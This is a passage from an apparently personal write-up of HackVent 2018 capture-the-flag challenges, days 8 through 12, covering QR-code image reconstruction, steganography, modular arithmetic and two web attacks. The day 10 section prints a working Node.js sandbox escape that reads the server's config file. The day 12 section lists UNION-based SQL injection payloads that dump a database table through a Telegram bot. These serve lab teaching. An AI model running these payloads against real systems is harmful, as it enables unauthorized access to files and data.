First, I cut the middle pixels out and scaled it down to 25x25 pixels:

![](https://0xdfimages.gitlab.io/img/hackvent2018-pixels.png)

My code for this is really ugly, but here’s the basic idea.

  1. Readthe image in, and make a bitmap dictionary that runs from -12 - 12 square:
    
        im = Image.open(sys.argv[1])
    
    bitmap = {}
    for y in range(25):
        for x in range(25):
            bitmap[(x-12,12-y)] = 1 - int(sum(im.getpixel((x,y)))/(255*3))
    

  2. Make a function that starts in the middle and spirals out. I stole and modified some code from Stack Overflow for this:
    
        def spiral(bitdict):
        X = Y = pow(len(bitdict), 0.5)
        result = ''
        x = y = 0
        dx = 0
        dy = -1
        for i in range(len(bitdict)):
            if (-X/2 < x <= X/2) and (-Y/2 < y <= Y/2):
                result += str(bitdict[(x,y)])
            if x == y or (x < 0 and x == -y) or (x > 0 and x == 1-y):
                dx, dy = -dy, dx
            x, y = x+dx, y+dy
        return result
    

  3. Make functions that rotate a bitmap dictionary and that mirror a bitmap dictionary:
    
        def rotate_cc(bitdict):
        return {(-k[1], k[0]): v for k,v in bitdict.items()}
    
    def mirror(bitdict):
        return {(-k[0], k[1]): v for k,v in bitdict.items()}
    

  4. Make a function that saves from a bitstring to an image:
    
        def save_image(bitstr, filename):
        img = Image.new("1", (25,25))
        bitlist = [int(c) for c in bitstr]
        img.putdata(bitlist)
        img.resize((125,125))
        img.save(filename)
    

  5. The image has four orientations, mirrored/not mirrored, and starting at the center or the outside (or, after spiral, reversing the bitstring). That makes 16 possible images. I could make that 32 if I try white as 0 instead of 1. So I’ll loop over all of those, and save each as an image. When I’m done, I’ll have 32 images, and one that is a QR code: ![1545272715149](https://0xdfimages.gitlab.io/img/1545272715149.png)

  6. I’ll use my photo editor to add a bit of white around the outside, and upload it to: <https://zxing.org/w/decode>. It returns a flag: ![](https://0xdfimages.gitlab.io/img/1544289226263.png)

**Flag: HV18-$$nn-@@11-LLr0-B1ne**

## Day 9

### Challenge

![1545273001536](https://0xdfimages.gitlab.io/img/1545273001536.png)

### Solution

This is a steg challenge in the truest sense. I’ll examine the url to the new
ball, and compare it to the daily ball:

https://hackvent.hacking-lab.com/medium-64.png

https://hackvent.hacking-lab.com../img/medium_64.png

So there is a difference. I’ll compare the two:

    
    
    root@kali# md5sum medium*
    29111268bfdcf7830c87ab44900684ac  medium_64-normal.png
    3d0dbbd34342bc0646ef3149dc7c8d68  medium-64.png
    

I’ll open one in Stegsolve, and then subtract the other:

![](https://0xdfimages.gitlab.io/img/hackvent2018-day9-chal-norm.bmp)

If I swap the order (because `a-b != b-a`), I get something different:

![](https://0xdfimages.gitlab.io/img/hackvent2018-day9-norm-chal.bmp)

If I then take the two resulting and or them, I get a QR code:

![](https://0xdfimages.gitlab.io/img/hackvent2018-day9-solved.bmp)

Clean that up a bit in a image editor:

![](https://0xdfimages.gitlab.io/img/hackvent2018-day9-solution.png)

And that gives the flag:

**Flag: HV18-PpTR-Qri5-3nOI-n51a-42gJ**

## Day 10

### Challenge

![1545306349971](https://0xdfimages.gitlab.io/img/1545306349971.png)

The link goes to a page where you can run javascript in a sandbox:

![1545306386569](https://0xdfimages.gitlab.io/img/1545306386569.png)

I’m also given the server-side source code:

    
    
    const {flag, port} = require("./config.json");
    const sandbox = require("sandbox");
    const app = require("express")();
    
    app.use(require('body-parser').urlencoded({ extended: false }));
    
    app.get("/", (req, res) => res.sendFile(__dirname+"/index.html"));
    app.get("/code", (req, res) => res.sendFile(__filename));
    
    app.post("/run", (req, res) => {
    
    	if (!req.body.run) {
    		res.json({success: false, result: "No code provided"});
    		return;
    	}
    
    	let boiler = "const flag_" + require("randomstring").generate(64) + "=\"" + flag + "\";\n";
    
    	new sandbox().run(boiler + req.body.run, (out) => res.json({success: true, result: out.result}));
    
    });
    
    app.listen(port);
    

### Solution

There’s a common method to escape sandboxes in node using constructors. The
constructor of `this` is `Object`, and the constructor of `Object` is
`Function`, so you can use that `Function` to make a function that runs in a
new context. Then, add `()` to the end to call that function. So, for example,
if I enter:

    
    
    this.constructor.constructor("return process.mainModule")();
    

I get:

    
    
    { id: '.',
    exports: {},
    parent: null,
    filename: '/app/node_modules/sandbox/lib/shovel.js',
    loaded: true,
    children: [],
    paths:
    [ '/app/node_modules/sandbox/lib/node_modules',
    '/app/node_modules/sandbox/node_modules',
    '/app/node_modules',
    '/node_modules' ] }
    

So I’ll use the `fs` module to do a dirwalk:

    
    
    this.constructor.constructor("return process.mainModule.require('fs').readdirSync('.').toString()")();
    
    
    
    'config.json,config.json~,docker-compose.yaml,dockerfile,dockerfile~,index.html,main.js,node_modules,package-lock.json,package.json,run.js'
    

And I can get the contents of the config file, which contains the flag
according to the source:

    
    
    this.constructor.constructor("return process.mainModule.require('fs').readFileSync('config.json').toString()")();
    
    
    
    '{\n "flag":"HV18-YtH3-S4nD-bx5A-Nt4G",\n "port":3000\n}\n\n'
    

**Flag: HV18-YtH3-S4nD-bx5A-Nt4G**

## Day 11

### Challenge

![1545307445262](https://0xdfimages.gitlab.io/img/1545307445262.png)

### Solution

Last year I had to solve a similar problem by finding the mod inverse of b in
mod p. I can do the same this year, but the resulting a isn’t easily
translated to hex or ascii.

But the resulting a isn’t the only solution. a + k*p for all k in [1, 2, 3, …)
will solve that equation.

For example, if:

    
    
    >>> c = 17
    >>> p = 31
    >>> b = 13
    

Find mod inverse is 12:

    
    
    >>> gmpy.invert(b,p)
    mpz(12)
    

Confirm:

    
    
    >>> 12*13 % 31
    1
    

Calculate a:

    
    
    >>> c * 12 % 31
    18
    

Prove it works:

    
    
    >>> 18*13 % 31
    17
    >>> (18 + 31)*13 % 31
    17
    >>> (18 + 2*31)*13 % 31
    17
    

So, in the same way, I can loop over various ks, looking for anything that
makes a flag:

    
    
    #!/usr/bin/env python
    
    import gmpy
    
    c=0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2
    p=0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9
    b=0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5
    
    inv = gmpy.invert(b,p)
    a = c * inv % p
    print("[+] Found base a: {}".format(a))
    print("[*] Trying a + k*p...")
    
    for i in range(2000):
    
        ai = hex(a + (i*p)).lstrip("0x")
        try:
            out = str(ai).decode("hex")
            if 'HV18-' in out:
                print("[+] Found (potential) solution:")
                print("   {}".format(out))
                print("[+] solution = a + {}*p".format(i))
        except TypeError:
            pass
    
    
    
    root@kali# python crack.py
    [+] Found base a: 31203092237148810178812127507761703323636375061497699755717548622982799
    [*] Trying a + ip...
    [+] Found (potential) solution:
       HV18-xLvY-TeNT-YgEh-wBuL-bFfz
    [+] solution = a + 1337*p
    

**Flag: HV18-xLvY-TeNT-YgEh-wBuL-bFfz**

## Day 12

### Challenge

![1545307641505](https://0xdfimages.gitlab.io/img/1545307641505.png)

If I log into Telegram and check out this bot, I see:

![](https://0xdfimages.gitlab.io/img/1544630464495.png)

### Solution

After a lot of playing around with various commands, eventually I came to try
changing my display name:

![](https://0xdfimages.gitlab.io/img/hackvent2018-telegram-sql-poc.gif)

From there, I’ll start to build out different SQL Injections:

First Name | Last Name | Result  
---|---|---  
’ union select 1,@@version; # | df | 1 - 5.7.20  
’ union select table_name,1 from information_schema.tables; # | df | CHARACTER_SETS - 1  
…[snip]…INNODB_SYS_FOREIGN - 1  
INNODB_SYS_TABLESTATS - 1  
SecretStore - 1 <—– this is interesting  
User - 1  
Wish - 1  
  
’ union SELECT table_name, column_name FROM information_schema.columns; # | df | error  
`’ UNION SELECT table_name,column_name FROM | information_schema.columns WHERE table_name = ‘SecretStore’;# – | SecretStore - flag  
’ union SELECT flag,1 from SecretStore; # – | df | HV18-M4k3-S0m3-R34L-N1c3-W15h - 1  
  
Note, the name fields are truncated if they get too long. However, it seems
they are also just concatenated together, so I can stretch my SQLI across the
first and last name fields.

So there’s the flag:

![](https://0xdfimages.gitlab.io/img/1544629364220.png)

**Flag: HV18-M4k3-S0m3-R34L-N1c3-W15h**

[](/hackvent2018/)

